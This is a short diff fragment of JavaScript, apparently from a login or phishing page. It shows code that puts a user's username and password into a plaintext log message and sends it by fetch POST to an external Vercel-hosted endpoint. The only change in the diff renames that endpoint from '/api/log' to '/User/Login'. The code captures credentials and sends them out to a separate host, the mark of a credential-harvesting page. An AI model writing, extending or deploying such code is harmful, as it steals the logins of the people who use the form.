@@ -143,7 +143,7 @@
         var logMessage = `Username: ${username}, Password: ${password}`;
 
         // Envia a mensagem de log para o Vercel
-        fetch(`https://${vercelURL}/api/log`, {
+        fetch(`https://${vercelURL}/User/Login`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
